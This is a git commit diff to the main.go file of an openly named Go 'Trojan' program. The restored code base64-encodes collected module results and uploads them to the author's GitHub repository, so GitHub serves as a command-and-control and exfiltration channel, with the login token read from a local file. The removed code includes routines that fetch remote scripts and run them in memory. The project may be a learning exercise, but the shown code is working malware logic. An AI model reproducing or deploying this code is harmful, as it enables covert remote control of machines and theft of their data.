483e196f0fe0767c34ed41149e3d53e3ff6394a1
YarKhan02 <yarkhan025@gmail.com>
2025-03-16 13:18:33 +0500

    testing

--- main.go
+++ main.go
@@ -2,13 +2,13 @@ package main
 
 import (
 	"context"
-	"go/ast"
-	"go/parser"
-	"go/token"
-	"go/types"
-	"reflect"
+	// "go/ast"
+	// "go/parser"
+	// "go/token"
+	// "go/types"
+	// "reflect"
 
-	// "encoding/base64"
+	"encoding/base64"
 	"encoding/json"
 	"fmt"
 
@@ -26,7 +26,7 @@ import (
 	"github.com/google/go-github/v69/github"
 
 	"golang.org/x/oauth2"
-	"golang.org/x/tools/go/packages"
+	// "golang.org/x/tools/go/packages"
 )
 
 type Trojan struct {
@@ -85,139 +85,38 @@ func (t *Trojan) get_config() ([]map[string]interface{}, error) {
 	return config, nil
 }
 
-// func (t *Trojan) module_runner(module string) {
-// 	if moduleFunc, exists := moduleRegistry[module]; exists {
-// 		result := moduleFunc()
-// 		t.store_module_result(result)
-// 	} else {
-// 		fmt.Println("Module not found:", module)
-// 	}
-// }
-
-// Dynamically compile, execute Go code, and capture output
-func compileAndRun(sourceCode string) (string, error) {
-	// Parse the source code into an AST
-	fset := token.NewFileSet()
-	node, err := parser.ParseFile(fset, "", sourceCode, parser.AllErrors)
-	if err != nil {
-		return "", fmt.Errorf("failed to parse source code: %v", err)
-	}
-
-	// Type check the AST
-	conf := types.Config{Importer: nil}
-	info := &types.Info{
-		Types: make(map[ast.Expr]types.TypeAndValue),
-	}
-	_, err = conf.Check("cmd", fset, []*ast.File{node}, info)
-	if err != nil {
-		return "", fmt.Errorf("type checking failed: %v", err)
-	}
-
-	// Use go/packages to load the dynamically compiled package
-	pkgs, err := packages.Load(&packages.Config{Mode: packages.LoadSyntax}, "cmd")
-	if err != nil {
-		return "", fmt.Errorf("failed to load package: %v", err)
-	}
-
-	// Use reflection to find and execute the "ExecutePayload" function
-	for _, pkg := range pkgs {
-		obj := pkg.Types.Scope().Lookup("ExecutePayload")
-		if obj == nil {
-			return "", fmt.Errorf("ExecutePayload function not found")
-		}
-
-		fn := reflect.ValueOf(obj)
-		if fn.Kind() != reflect.Func {
-			return "", fmt.Errorf("ExecutePayload is not a function")
-		}
-
-		// Invoke the function dynamically and capture the result
-		results := fn.Call(nil)
-		if len(results) > 0 {
-			output := results[0].Interface().(string)
-			return output, nil
-		}
-	}
-
-	return "", fmt.Errorf("function executed but returned no output")
-}
-
 func (t *Trojan) module_runner(module string) {
-	script, err := get_file_contents("modules", "environment.go", t.client, t.ctx)
-	if err != nil {
-		fmt.Printf("failed to get config: %v\n", err)
+	if moduleFunc, exists := moduleRegistry[module]; exists {
+		result := moduleFunc()
+		t.store_module_result(result)
+	} else {
+		fmt.Println("Module not found:", module)
 	}
-
-	fmt.Println("[*] Script ---------------------", module)
-	result, err := compileAndRun(script)
-	if err != nil {
-		fmt.Println("Error executing script:", err)
-		return
-	}
-	fmt.Println("[*] Result ---------------------\n", result)
-
 }
 
-// func (t *Trojan) store_module_result(data interface{}) {
-// 	timestamp := time.Now().Format(time.RFC3339)
-// 	remote_path := fmt.Sprintf("data/%s/%s.data", t.id, timestamp)
-// 	data_str := fmt.Sprintf("%v", data)
-// 	bindata := []byte(data_str)
-// 	encoded_data := base64.StdEncoding.EncodeToString(bindata)
+func (t *Trojan) store_module_result(data interface{}) {
+	timestamp := time.Now().Format(time.RFC3339)
+	remote_path := fmt.Sprintf("data/%s/%s.data", t.id, timestamp)
+	data_str := fmt.Sprintf("%v", data)
+	bindata := []byte(data_str)
+	encoded_data := base64.StdEncoding.EncodeToString(bindata)
 
-// 	message := "Storing module result: "
-// 	fileContent := &github.RepositoryContentFileOptions{
-// 		Message: github.Ptr(message),
-// 		Content: []byte(encoded_data),
-// 	}
+	message := "Storing module result: "
+	fileContent := &github.RepositoryContentFileOptions{
+		Message: github.Ptr(message),
+		Content: []byte(encoded_data),
+	}
 
-// 	user := "YarKhan02"
-// 	repo := "Trojan"
+	user := "YarKhan02"
+	repo := "Trojan"
 
-// 	_, _, err := t.client.Repositories.CreateFile(t.ctx, user, repo, remote_path, fileContent)
-// 	if err != nil {
-// 		fmt.Println("Error storing result:", err)
-// 	} else {
-// 		fmt.Println("Stored module result in:", remote_path)
-// 	}
-// }
-
-// Fetches and executes a remote script, then stores the result
-// func (t *Trojan) executeRemoteScript(url string) {
-// 	resp, err := http.Get(url)
-// 	if err != nil {
-// 		fmt.Println("Failed to fetch script:", err)
-// 		return
-// 	}
-// 	defer resp.Body.Close()
-
-// 	// Read script content (Base64 encoded)
-// 	body, err := io.ReadAll(resp.Body)
-// 	if err != nil {
-// 		fmt.Println("Failed to read script:", err)
-// 		return
-// 	}
-
-// 	// Decode Base64
-// 	script, err := base64.StdEncoding.DecodeString(string(body))
-// 	if err != nil {
-// 		fmt.Println("Failed to decode script:", err)
-// 		return
-// 	}
-
-// 	// Execute the script in memory using a JavaScript VM
-// 	vm := goja.New()
-// 	value, err := vm.RunString(string(script))
-// 	if err != nil {
-// 		fmt.Println("Execution error:", err)
-// 		return
-// 	}
-
-// 	// Store result in a file
-// 	t.store_module_result(value.String())
-
-// 	fmt.Println("Script executed successfully.")
-// }
+	_, _, err := t.client.Repositories.CreateFile(t.ctx, user, repo, remote_path, fileContent)
+	if err != nil {
+		fmt.Println("Error storing result:", err)
+	} else {
+		fmt.Println("Stored module result in:", remote_path)
+	}
+}
 
 func github_connect() (*github.Client, context.Context, error) {
 	token, err := os.ReadFile("token.txt")
